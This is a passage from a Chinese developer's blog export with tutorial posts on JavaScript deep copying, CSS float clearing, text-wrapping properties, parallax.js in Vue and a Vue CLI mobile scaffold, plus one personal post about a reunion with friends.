<h1 id="3-深拷贝的实现"><a href="#3-深拷贝的实现" class="headerlink" title="3.深拷贝的实现"></a>3.深拷贝的实现</h1><h2 id="3-1-JSON-parse-JSON-stringify"><a href="#3-1-JSON-parse-JSON-stringify" class="headerlink" title="3.1 JSON.parse(JSON.stringify())"></a>3.1 JSON.parse(JSON.stringify())</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> o7 = [<span class="number">1</span>, <span class="number">3</span>, &#123;</span><br><span class="line">    username: <span class="string">' kobe'</span></span><br><span class="line">&#125;];</span><br><span class="line"><span class="keyword">let</span> o8 = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(o7));</span><br><span class="line">o8[<span class="number">2</span>].username = <span class="string">'duncan'</span>; </span><br><span class="line"><span class="built_in">console</span>.log(o7, o8)<span class="comment">//只有一个变了</span></span><br><span class="line"><span class="comment">//需要注意的是 这个没办法处理函数 如果有函数得话 拷贝时会拷贝掉</span></span><br></pre></td></tr></table></figure>
<h2 id="3-2-递归拷贝"><a href="#3-2-递归拷贝" class="headerlink" title="3.2 递归拷贝"></a>3.2 递归拷贝</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkedType</span>(<span class="params">target</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">Object</span>.prototype.toString.call(target).slice(<span class="number">8</span>, <span class="number">-1</span>)<span class="comment">//获取参数的数据类型</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//实现深度克隆---对象/数组</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">clone</span>(<span class="params">target</span>) </span>&#123;</span><br><span class="line">      <span class="comment">//判断拷贝的数据类型</span></span><br><span class="line">      <span class="comment">//初始化变量result 成为最终克隆的数据</span></span><br><span class="line">      <span class="keyword">let</span> result, targetType = checkedType(target)</span><br><span class="line">      <span class="keyword">if</span> (targetType === <span class="string">'Object'</span>) &#123;</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (targetType === <span class="string">'Array'</span>) &#123;</span><br><span class="line">        result = []</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> target</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//遍历目标数据</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> target) &#123;</span><br><span class="line">        <span class="comment">//获取遍历数据结构的每一项值。</span></span><br><span class="line">        <span class="keyword">let</span> value = target[i]</span><br><span class="line">        <span class="comment">//判断目标结构里的每一值是否存在对象/数组</span></span><br><span class="line">        <span class="keyword">if</span> (checkedType(value) === <span class="string">'Object'</span> ||</span><br><span class="line">          checkedType(value) === <span class="string">'Array'</span>) &#123; <span class="comment">//对象/数组里嵌套了对象/数组</span></span><br><span class="line">          <span class="comment">//继续遍历获取到value值</span></span><br><span class="line">          result[i] = clone(value)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">//获取到value值是基本的数据类型或者是函数。</span></span><br><span class="line">          result[i] = value;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> result</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> o9 = &#123;</span><br><span class="line">      a:<span class="number">1</span>,</span><br><span class="line">      b:&#123;</span><br><span class="line">        a:<span class="number">2</span>,</span><br><span class="line">        c:&#123;</span><br><span class="line">          num: <span class="number">100</span></span><br><span class="line">        &#125;,</span><br><span class="line">        d:&#123;</span><br><span class="line">          <span class="keyword">do</span>: <span class="literal">true</span>,</span><br><span class="line">          e:&#123;</span><br><span class="line">            go: <span class="literal">false</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> o10 = clone(o9)</span><br><span class="line">    o10.a = <span class="string">'b'</span></span><br><span class="line">    o10.b.a = <span class="number">200</span></span><br><span class="line">    o10.b.c.num = <span class="number">1000</span></span><br><span class="line">    <span class="built_in">console</span>.log(o9)</span><br><span class="line">    <span class="built_in">console</span>.log(o10)<span class="comment">//都只会改变一个</span></span><br></pre></td></tr></table></figure>
<h2 id="3-3-第三方库（lodash）"><a href="#3-3-第三方库（lodash）" class="headerlink" title="3.3 第三方库（lodash）"></a>3.3 第三方库（lodash）</h2><p><a href="https://juejin.im/post/5b5dcf8351882519790c9a2e" target="_blank" rel="noopener">参考链接</a></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>清除浮动</title>
    <url>/2018/05/19/%E6%B8%85%E9%99%A4%E6%B5%AE%E5%8A%A8/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;最近在写网站的时候，在进行一些布局的过程中会有一些地方的东西没有按照自己的想法放在相应的位置，而是出现在一些很奇怪的地方，这才想起来是不是没有清除浮动。这个词在无数地方都看到过，也知道怎么清除浮动，但是自己没有实际练习过。所谓光说不练假把式，下面就实际演示一下吧。<br><a id="more"></a></p>
<h1 id="（一）什么时候要清除浮动"><a href="#（一）什么时候要清除浮动" class="headerlink" title="（一）什么时候要清除浮动"></a>（一）什么时候要清除浮动</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;当我们对元素设置float:left;之后元素就会浮动。如果不清除浮动就会出现很多问题，就像我们在写导航栏时，经常会使用浮动，这时没清除浮动的话，很可能出现父元素高度坍塌的情况。<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.parent</span>&#123;<span class="attribute">background</span>: <span class="number">#e75c62</span>;<span class="attribute">color</span>: <span class="number">#fff</span>; <span class="attribute">margin</span>: <span class="number">50px</span> auto;<span class="attribute">padding</span>: <span class="number">50px</span>;&#125;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">div</span><span class="selector-class">.child</span>&#123;</span></span><br><span class="line"><span class="undefined">        width: 80px;</span></span><br><span class="line"><span class="undefined">        height: 80px;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">float</span><span class="selector-pseudo">:left</span>;</span></span><br><span class="line"><span class="undefined">        background-color: deepskyblue;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"parent"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"child child1"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"child child2"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"child child3"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>此时如图所示，父元素高度塌陷没有自适应。<br><img src="/images/cl1.png" alt="My Pic"></p>
<h1 id="（二）怎么清除浮动"><a href="#（二）怎么清除浮动" class="headerlink" title="（二）怎么清除浮动"></a>（二）怎么清除浮动</h1><h2 id="1-新添加一个子元素并设置clear-both；"><a href="#1-新添加一个子元素并设置clear-both；" class="headerlink" title="1.新添加一个子元素并设置clear:both；"></a>1.新添加一个子元素并设置clear:both；</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    .parent&#123;background: #e75c62;color: #fff; margin: 50px auto;padding: 50px;&#125;</span><br><span class="line">    div.child&#123;</span><br><span class="line">        width: 80px;</span><br><span class="line">        height: 80px;</span><br><span class="line">        float:left;</span><br><span class="line">        background-color: deepskyblue;</span><br><span class="line">    &#125;</span><br><span class="line">    .clear&#123;</span><br><span class="line">    	clear:both;</span><br><span class="line">        height: 0; </span><br><span class="line">        line-height: 0; </span><br><span class="line">        font-size: 0;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div class=&quot;parent&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;child child1&quot;&gt;1&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;child child2&quot;&gt;2&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;child child3&quot;&gt;3&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;&lt;!--或者直接这样&lt;div class=&quot;clear&quot; style=&quot;clear:both;&quot;&gt;&lt;/div&gt;--!&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>这时如图  问题解决<br><img src="/images/cl.png" alt="My Pic"></p>
<h2 id="2-对父级设置样式overflow-auto"><a href="#2-对父级设置样式overflow-auto" class="headerlink" title="2.对父级设置样式overflow: auto;"></a>2.对父级设置样式overflow: auto;</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">.parent&#123;background: #e75c62;color: #fff; margin: 50px auto;padding: 50px;&#125;</span><br><span class="line">    div.child&#123;</span><br><span class="line">        width: 80px;</span><br><span class="line">        height: 80px;</span><br><span class="line">        float:left;</span><br><span class="line">        background-color: deepskyblue;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div class=&quot;parent&quot; style=&quot;overflow: auto;&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;child child1&quot;&gt;1&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;child child2&quot;&gt;2&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;child child3&quot;&gt;3&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>这时如图  同样可以解决问题 这里需要注意就是overflow: auto；有兼容性问题有时需要加上zoom: 1;<br><img src="/images/cl2.png" alt="My Pic"></p>
<h2 id="3-使用伪类-after或-before-根据不同的情况"><a href="#3-使用伪类-after或-before-根据不同的情况" class="headerlink" title="3.使用伪类:after或:before(根据不同的情况)"></a>3.使用伪类:after或:before(根据不同的情况)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    .parent&#123;background: #e75c62;color: #fff; margin: 50px auto;padding: 50px;&#125;</span><br><span class="line">    div.child&#123;</span><br><span class="line">        width: 80px;</span><br><span class="line">        height: 80px;</span><br><span class="line">        float:left;</span><br><span class="line">        background-color: deepskyblue;</span><br><span class="line">    &#125;</span><br><span class="line">    .parent:after &#123;</span><br><span class="line">    	clear:both;content:&apos;.&apos;;</span><br><span class="line">    	display:block;</span><br><span class="line">    	width: 0;height: 0;</span><br><span class="line">    	visibility:hidden;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div class=&quot;parent&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;child child1&quot;&gt;1&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;child child2&quot;&gt;2&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;child child3&quot;&gt;3&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>这时如图 这个方法是比较常用的它就是利用:after和:before来在元素内部插入两个元素块，从而达到清除浮动的效果。其实现原理类似于clear:both方法，只是区别在于:clear在html插入一个div.clear标签，而outer利用其伪类clear:after在元素内部增加一个类似于div.clear的效果。<br><img src="/images/cl2.png" alt="My Pic"><br>在补充一点别人总结的浮动的特点 转自<a href="https://blog.csdn.net/zengyonglan/article/details/53304487" target="_blank" rel="noopener">关于浮动的清除</a><br>1.浮动的元素，讲向左或者向右浮动，浮动到包围元素的边上，或者上一个浮动元素的边上为止。</p>
<p>2.浮动的元素，不再占用空间，且浮动元素的层级要高于普通元素。</p>
<p>3.浮动的元素，一定是块元素，不管之前是什么元素。</p>
<p>4.如果浮动的元素没有指定宽度的话，浮动后会尽可能变窄，因此浮动元素要指定宽和高。</p>
<p>5.一行的多个元素，要浮动大家一起浮动。</p>
]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title>理解word-break、word-wrap、white-space</title>
    <url>/2019/08/11/%E7%90%86%E8%A7%A3word-break%E3%80%81word-wrap%E3%80%81white-space/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;我们在日常的工作中经常会遇到需要对文本显示的格式进行处理，比如控制换行、保留其中的空格和换行等。而与之相关的css属性主要包括了word-break、word-wrap、white-space这三个。下面就简单总结一下这三个属性的一些基本用法：<br><a id="more"></a></p>
<h3 id="测试HTMl"><a href="#测试HTMl" class="headerlink" title="测试HTMl"></a>测试HTMl</h3><hr>
<ul>
<li>主要是一个定宽的box，里边包含了一些换行,空格,以及一个较长的单词</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"box"</span> <span class="attr">style</span>=<span class="string">"border: 1px dashed #000;position: relative;width:130px;display: inline-block;"</span>&gt;</span></span><br><span class="line">test&amp;nbsp;&amp;nbsp;<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">ha ha ha I think i'm the king of the responsibilityworld</span><br><span class="line"><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">测试&amp;nbsp;&amp;nbsp;<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">哈 哈 哈 我认为我是这个有责任的世界的王</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>目前的基本样式如下图所示：</p>
</blockquote>
<p><img src="/images/word1.png" alt="My Pic"></p>
<blockquote>
<p>目前可以看到，换行和单个空格已经生效了，而连续的空格会被缩减成一个，换行符也全都无效。句子超过一行后会自动换行，而长度超过一行的单个单词会超出边界。接下来我们看下， 给它上面三个css属性赋值后会出现什么变化。</p>
<h3 id="write-space"><a href="#write-space" class="headerlink" title="write-space"></a>write-space</h3></blockquote>
<hr>
<blockquote>
<p>这个属性是用来控制空白字符的显示的，同时还能控制是否自动换行。它有五个值：normal | nowrap | pre | pre-wrap | pre-line。因为默认是normal，所以我们主要研究下其它四种值时的展现情况。</p>
</blockquote>
<ul>
<li>white-space:nowrap<table><tr><td><center><img src="/images/word1.png"></center></td><td><center><img src="/images/word2.png"></center></td></tr></table>

</li>
</ul>
<blockquote>
<p>可以看到这个属性作用就是不换行，除非是<br> 多个空格也同样的会合并为一个</p>
</blockquote>
<ul>
<li>white-space:pre</li>
</ul>
<table><tr><td><center><img src="/images/word1.png"></center></td><td><center><img src="/images/word3.png"></center></td></tr></table>

<blockquote>
<p>可以看到空格和换行符保留下来了，自动换行还是没有了</p>
</blockquote>
<ul>
<li>white-space:pre-wrap<table><tr><td><center><img src="/images/word1.png"></center></td><td><center><img src="/images/word4.png"></center></td></tr></table>

</li>
</ul>
<blockquote>
<p>可以看到其实效果有点像pre + wrap 保留空格和换行符，而且同时自动换行</p>
</blockquote>
<ul>
<li>white-space:pre-line<table><tr><td><center><img src="/images/word1.png"></center></td><td><center><img src="/images/word5.png"></center></td></tr></table>

</li>
</ul>
<blockquote>
<p>空格被合并了，但是换行符可以发挥作用 同时也可以自动换行</p>
</blockquote>
<p>根据上面的情况总结为下表</p>
<table>
<thead>
<tr>
<th>是否发挥作用</th>
<th>换行符</th>
<th>空格</th>
<th>自动换行</th>
<th><br>, nbsp;</th>
</tr>
</thead>
<tbody>
<tr>
<td>normal</td>
<td>x</td>
<td>x（合并）</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>nowrap</td>
<td>x</td>
<td>x（合并）</td>
<td>x</td>
<td>√</td>
</tr>
<tr>
<td>pre</td>
<td>√</td>
<td>√</td>
<td>x</td>
<td>√</td>
</tr>
<tr>
<td>pre-wrap</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>pre-line</td>
<td>√</td>
<td>x</td>
<td>√</td>
<td>√</td>
</tr>
</tbody>
</table>
<h3 id="word-break"><a href="#word-break" class="headerlink" title="word-break"></a>word-break</h3><hr>
<blockquote>
<p>这个属性是控制单词如何被拆分换行的。它有三个值：normal | break-all | keep-all。</p>
</blockquote>
<ul>
<li>word-break:keep-all<table><tr><td><center><img src="/images/word1.png"></center></td><td><center><img src="/images/word6.png"></center></td></tr></table>

</li>
</ul>
<blockquote>
<p>所有“单词”一律不拆分换行，注意，我这里的“单词”包括连续的中文字符（还有日文、韩文等），或者可以理解为只有空格可以触发自动换行</p>
</blockquote>
<ul>
<li><p>word-break:break-all</p>
<table><tr><td><center><img src="/images/word1.png"></center></td><td><center><img src="/images/word7.png"></center></td></tr></table>

<blockquote>
<p>所有单词碰到边界一律拆分换行，不管你是一行都显示不下的单词，还是很短的单词，只要碰到边界，都会被强制拆分换行。</p>
</blockquote>
</li>
</ul>
<h3 id="word-wrap（overflow-wrap）"><a href="#word-wrap（overflow-wrap）" class="headerlink" title="word-wrap（overflow-wrap）"></a>word-wrap（overflow-wrap）</h3><hr>
<blockquote>
<p>这个属性也是控制单词如何被拆分换行的，实际上是作为word-break的互补，它只有两个值：normal | break-word</p>
</blockquote>
<ul>
<li>word-wrap:break-word<br><table><tr><td><center><img src="/images/word7.png"></center></td><td><center><img src="/images/word8.png"></center></td></tr></table><blockquote>
<p>只有当一个单词一整行都显示不下时，才会拆分换行该单词。所以我觉得overflow-wrap更好理解好记一些，overflow，只有长到溢出的单词才会被强制拆分换行！</p>
</blockquote>
</li>
</ul>
<blockquote>
<p><a href="https://juejin.im/post/5b8905456fb9a01a105966b4" target="_blank" rel="noopener">参考链接-掘金</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Css</category>
      </categories>
      <tags>
        <tag>Css</tag>
      </tags>
  </entry>
  <entry>
    <title>相聚和别离</title>
    <url>/2019/02/25/%E7%9B%B8%E8%81%9A%E5%92%8C%E5%88%AB%E7%A6%BB/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;上周终于和高中的好朋友们聚上了一次，还真的是挺不容易的，我们五个从不同的地方汇聚到一个地方，有的要坐火车，有的要好几个小时。毕竟离我们上次见面也快一年了，大概也没有什么比得上真正的好朋友聚在一起聊聊自己的生活和将来的打算、遇到的好笑和奇怪的事要舒服和开心的了吧。<br><a id="more"></a><br>&nbsp;&nbsp;&nbsp;&nbsp;虽然一开始大家还是会有点拘谨，毕竟也好久没有面对面说过话了。随着一两个自己之前的趣事或者一个玩笑，彼此又是那么的熟悉。也许玩耍计划并不那么的完美也并不那么的顺利，但还是和以前一样，只要彼此能在一起。遇到再遭的事，彼此看着看着也能傻呵呵的笑出来。大家也真的长大了，我们之前的小女生，也能熟练的画点淡妆、那些小男孩，也能熟练的开着共享汽车载着我们去往目的地。也确实该长大了，这时我也会想，我也变了么，有什么不一样了么（大概没变的只有这份帅气了吧）<br>&nbsp;&nbsp;&nbsp;&nbsp;其实最后想来这两天确实也没玩什么，时间一下子就过去了。我们玩耍的项目也变成了，逛景点、吃小吃、打牌、唱歌。唯一不变的是我们还是会聊着之前高中的生活，聊着发生的琐碎但却温暖的事情，聊着现在同学的趣事，聊着我们。这次最大的改变是，我们也竟然开始讨论着什么时候结婚生小孩，准备在哪工作，以后谁先结婚，份子钱包多少等等。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;充电之后自己也要加油啦，我们都要加油，都要变得更好，我永远是你们的后盾。你们也要顺利啊 考上研 找到一个好工作  我们都是最棒的 哇哇哇哇哇哇<br><img src="/images/family.jpg" alt="My Pic"></p>
]]></content>
      <categories>
        <category>生活分享</category>
      </categories>
      <tags>
        <tag>生活分享</tag>
      </tags>
  </entry>
  <entry>
    <title>移动端的重力感应</title>
    <url>/2018/09/06/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E7%9A%84%E9%87%8D%E5%8A%9B%E6%84%9F%E5%BA%94/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;最近的一个项目中，UI给了图之后，给我描述了一下他想要的效果，就是有四个图层，希望在移动端重力的作用下以不同的速度晃动，刚听到这样要求的我内心是崩溃的。首先是自己之前没有使用过这一块的东西，然后是自己感觉这个东西实现起来会比较的复杂。虽然很恐惧，但是自己还是和设计说应该能实现。于是自己下来之后就疯狂的查资料，最后幸运的找到了parallax.js。把它装到了自己的vue项目中，下面是自己使用它的代码<br><a id="more"></a><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">"sence"</span>&gt;</span><br><span class="line">&lt;div data-depth=<span class="string">"1.00"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"../assets/images/bg_1.png"</span> <span class="attr">class</span>=<span class="string">"b1"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;div data-depth=<span class="string">"0.40"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"../assets/images/bg_2.png"</span> <span class="attr">class</span>=<span class="string">"b2"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;div data-depth=<span class="string">"0.70"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"../assets/images/bg_3.png"</span> <span class="attr">class</span>=<span class="string">"b3"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;div data-depth=<span class="string">"0.00"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"../assets/images/title.png"</span> <span class="attr">class</span>=<span class="string">"b4"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">var scene = document.getElementById('sence');</span></span><br><span class="line"><span class="regexp">var parallax = new Parallax(scene,&#123;</span></span><br><span class="line"><span class="regexp">onReady: myAwesomeCallback,</span></span><br><span class="line"><span class="regexp">calibrateX: false,</span></span><br><span class="line"><span class="regexp">calibrateY: true,</span></span><br><span class="line"><span class="regexp">invertX: false,</span></span><br><span class="line"><span class="regexp">invertY: true,</span></span><br><span class="line"><span class="regexp">limitX: false,</span></span><br><span class="line"><span class="regexp">limitY: 10,</span></span><br><span class="line"><span class="regexp">scalarX: 8,</span></span><br><span class="line"><span class="regexp">scalarY: 8,</span></span><br><span class="line"><span class="regexp">frictionX: 0.2,</span></span><br><span class="line"><span class="regexp">frictionY: 0.8,</span></span><br><span class="line"><span class="regexp">originX: 0.0,</span></span><br><span class="line"><span class="regexp">originY: 1.0</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">   &#125;);</span></span><br></pre></td></tr></table></figure></p>
<p>其实就是选中元素，对元素加上重力感应效果，一些参数设置晃动的幅度，方向等等。<br><a href="https://www.codoon.com/activity/v1/qixi-activity/index.html#/" target="_blank" rel="noopener">项目效果</a></p>
]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
      <tags>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>移动端通用脚手架</title>
    <url>/2020/03/28/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E9%80%9A%E7%94%A8%E8%84%9A%E6%89%8B%E6%9E%B6/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;最近一段时间由于疫情的影响都在家，由于之前工作上的需要搭建了一个移动端的通用脚手架，使用vue-cli3搭建。主要包含了service插件开发、sass全局引入、移动端适配、图片预加载、全局错误收集、axios和vuex初始化。<br><a id="more"></a></p>
<h3 id="service插件开发"><a href="#service插件开发" class="headerlink" title="service插件开发"></a>service插件开发</h3><blockquote>
<p>service插件主要放在项目本地，是一份js代码，然后导出一个函数，通过package.json配置指向这个js文件的路径。运行相应的命令时执行相应的功能。另外还有cli插件，有完整的开发目录它应该始终包含一个 Service 插件作为其主要导出，且可选的包含一个 Generator 和一个 Prompt 文件</p>
</blockquote>
<h4 id="导出函数"><a href="#导出函数" class="headerlink" title="导出函数"></a>导出函数</h4><blockquote>
<p>一个 service 插件应该导出一个函数，这个函数接受两个参数：</p>
<ul>
<li>一个plugin实例</li>
<li>一个包含 vue.config.js 内指定的项目本地选项的对象，或者在 package.json 内的 vue 字段</li>
</ul>
<p>这个 API 允许 service 插件针对不同的环境扩展/修改内部的 webpack 配置，并向 vue-cli-service 注入额外的命令。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">api, projectOptions</span>) =&gt;</span> &#123;</span><br><span class="line">  api.chainWebpack(<span class="function"><span class="params">webpackConfig</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 通过 webpack-chain 修改 webpack 配置</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  api.configureWebpack(<span class="function"><span class="params">webpackConfig</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 修改 webpack 配置</span></span><br><span class="line">    <span class="comment">// 或返回通过 webpack-merge 合并的配置对象</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  api.registerCommand(<span class="string">'test'</span>, args =&gt; &#123;</span><br><span class="line">    <span class="comment">// 注册 `vue-cli-service test`</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="在插件中解析-webpack-配置"><a href="#在插件中解析-webpack-配置" class="headerlink" title="在插件中解析 webpack 配置"></a>在插件中解析 webpack 配置</h4><blockquote>
<p>一个插件可以通过调用 api.resolveWebpackConfig() 取回解析好的 webpack 配置。每次调用都会新生成一个 webpack 配置用来在需要时进一步修改。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="params">api</span> =&gt;</span> &#123;</span><br><span class="line">  api.registerCommand(<span class="string">'my-build'</span>, args =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> configA = api.resolveWebpackConfig()</span><br><span class="line">    <span class="keyword">const</span> configB = api.resolveWebpackConfig()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 针对不同的目的修改 `configA` 和 `configB`...</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 请确保为正确的环境变量指定默认模式</span></span><br><span class="line"><span class="built_in">module</span>.exports.defaultModes = &#123;</span><br><span class="line">  <span class="string">'my-build'</span>: <span class="string">'production'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="第三方插件的自定义选项"><a href="#第三方插件的自定义选项" class="headerlink" title="第三方插件的自定义选项"></a>第三方插件的自定义选项</h4><blockquote>
<p>vue.config.js 的导出将会通过一个 schema 的验证以避免笔误和错误的配置值。然而，一个第三方插件仍然允许用户通过 pluginOptions 字段配置其行为。例如，对于下面的 vue.config.js：</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  pluginOptions: &#123;</span><br><span class="line">      fontsmin: &#123;</span><br><span class="line">        originPath: <span class="string">'static/fonts'</span>,</span><br><span class="line">        destPath: <span class="string">'src/assets/fonts'</span>,</span><br><span class="line">        cssWritePath: <span class="string">'src/assets/styles/reset.scss'</span>,</span><br><span class="line">        fontCssRequirePath: <span class="string">'./assets/fonts'</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>可参照<a href="ttps://cli.vuejs.org/zh/dev-guide/plugin-dev.html#service-%E6%8F%92%E4%BB%B6" target="_blank" rel="noopener">官网</a></p>
</blockquote>
<h3 id="Sass全局引入"><a href="#Sass全局引入" class="headerlink" title="Sass全局引入"></a>Sass全局引入</h3><blockquote>
<p>直接引入相应的包含变量、方法、mixin等的sass文件时，使用时会找不到相应的方法。所以需要使用相应的loader来解析引入。<br>安装依赖</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install sass-resources-loader --save</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在vue.config.js中配置引入</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  css: &#123;</span><br><span class="line">    loaderOptions: &#123;</span><br><span class="line">      scss: &#123;</span><br><span class="line">        prependData: <span class="string">`@import "~@/assets/styles/common.scss";`</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="移动端适配"><a href="#移动端适配" class="headerlink" title="移动端适配"></a>移动端适配</h3><blockquote>
<p>主要是通过viewport设置、根元素font-size和rem实现。再利用flexible.js。<br>viewport使用的最常用的设置</p>
</blockquote>
